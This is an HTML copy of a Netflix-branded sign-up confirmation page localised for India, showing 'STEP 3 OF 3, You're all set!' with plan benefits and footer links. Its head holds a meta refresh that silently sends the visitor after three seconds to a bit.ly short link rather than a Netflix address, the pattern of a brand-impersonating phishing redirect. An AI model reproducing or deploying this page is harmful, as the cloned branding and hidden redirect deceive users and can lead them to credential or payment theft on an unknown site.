...
<head>
	...
	<meta http-equiv = "refresh" content = "3; url = https://bit.ly/3JoEr6u" />
	<title>Netflix</title>
...
<body wfd-invisible="true">
	<div id="appMountPoint">
		<div class="netflix-sans-font-loaded">
			<div class="basicLayout notMobile modernInApp hasLargeTypography signupSimplicity-planSelectionWithContext simplicity" lang="en-IN" dir="ltr">
				...
				<div class="simpleContainer" data-transitioned-child="true">
					<div class="centerContainer contextStep" wfd-invisible="true" style="display: block; transform: none; opacity: 1; transition-duration: 250ms;">
						<div class="planContainer" data-uia="plan-context-page-container">
							...
							<div class="stepHeader-container" data-uia="header">
								<div class="stepHeader" data-a11y-focus="true" tabindex="0"><span id="" class="stepIndicator" data-uia="">STEP <b>3</b> OF <b>3</b></span>
									<h1 class="stepTitle" data-uia="stepTitle">You're all set!</h1></div>
							</div>
							<div class="contextBody contextRow">
								<ul class="checkmark-group" data-uia="checkmark-group">
									<li class="checkmark-group--row" data-uia="checkmark-group+row-0">
										...
										</svg><span class="checkmark-group--text" data-uia="checkmark-group+row-0+content">No commitments, cancel anytime.</span></li>
									<li class="checkmark-group--row" data-uia="checkmark-group+row-1">
										<svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="checkmark-group--icon" aria-hidden="true">
											<path fill-rule="evenodd" clip-rule="evenodd" d="M8.68239 19.7312L23.6824 5.73115L22.3178 4.26904L8.02404 17.6098L2.70718 12.293L1.29297 13.7072L7.29297 19.7072C7.67401 20.0882 8.28845 20.0988 8.68239 19.7312Z" fill="currentColor"></path>
										</svg><span class="checkmark-group--text" data-uia="checkmark-group+row-1+content">Everything on Netflix for one low price.</span></li>
									<li class="checkmark-group--row" data-uia="checkmark-group+row-2">
										<svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="checkmark-group--icon" aria-hidden="true">
											<path fill-rule="evenodd" clip-rule="evenodd" d="M8.68239 19.7312L23.6824 5.73115L22.3178 4.26904L8.02404 17.6098L2.70718 12.293L1.29297 13.7072L7.29297 19.7072C7.67401 20.0882 8.28845 20.0988 8.68239 19.7312Z" fill="currentColor"></path>
										</svg><span class="checkmark-group--text" data-uia="checkmark-group+row-2+content">No ads and no extra fees. Ever.</span></li>
								</ul>
							</div>
						</div>
						<div class="submitBtnContainer">
							<button type="button" autocomplete="off" tabindex="0" class="nf-btn nf-btn-primary nf-btn-solid nf-btn-oversize" data-uia="continue-button" placeholder="button_see_plans">Next</button>
						</div>
					</div>
				</div>
				<div class="site-footer-wrapper centered" style="transition-duration: 250ms; opacity: 1;">
					...
					<div class="site-footer">
						<p class="footer-top">Questions? Call <a class="footer-top-a" href="tel:000-800-040-1843 ">000-800-040-1843 </a></p>
						<ul class="footer-links structural">
							...
							<li class="footer-link-item" placeholder="footer_responsive_link_help_item"><a class="footer-link" data-uia="footer-link" href="https://help.netflix.com" placeholder="footer_responsive_link_help"><span id="" data-uia="data-uia-footer-label">Help Centre</span></a></li>
							...
							<div class="nfSelectWrapper inFooter selectArrow prefix" data-uia="language-picker+container">
								...
								<div class="nfSelectPlacement globe">
									<select data-uia="language-picker" class="nfSelect" id="lang-switcher-select" name="__langSelect" tabindex="0">
										<option selected="" label="English" lang="en" value="/signup?locale=en-IN">English</option>
										<option label="हिन्दी" lang="hi" value="/signup?locale=hi-IN">हिन्दी</option>
									</select>
								</div>
							</div>
						</div>
	...
	<iframe scrolling="no" frameborder="0" style="border: 0px; height: 50px; width: 48px; left: 1180px; top: 384px; z-index: 2147483647; position: absolute; display: none;" src="https://me.kis.v2.scr.kaspersky-labs.com/E3E8934C-235A-4B0E-825A-35A08381A191/kpm/kpm_promo_balloon.html?cssSrc=https%3A%2F%2Fme.kis.v2.scr.kaspersky-labs.com%2FE3E8934C-235A-4B0E-825A-35A08381A191%2Fkpm%2Ftooltip.css" wfd-invisible="true"></iframe>
	<iframe style="height: 1px; width: 1px; position: absolute; top: -9px; left: -9px;" src="https://ae.nflximg.net/monet/scripts/adtech_iframe_target_05.html?data=%7B%22membership_status%22%3A%22ANONYMOUS%22%2C%22country%22%3A%22IN%22%2C%22region_code%22%3A%22KL%22%2C%22is_member%22%3A%22anonymous%22%2C%22wasFormerMember%22%3Afalse%2C%22referrer%22%3A%22planSelectionContext%22%2C%22deniedConsentCookieGroups%22%3A%22C0003%2CC0004%2CC0005%22%7D" name="if-communicator-8958575074222" aria-hidden="true" data-uia="adtech-iframe"></iframe>
</body>
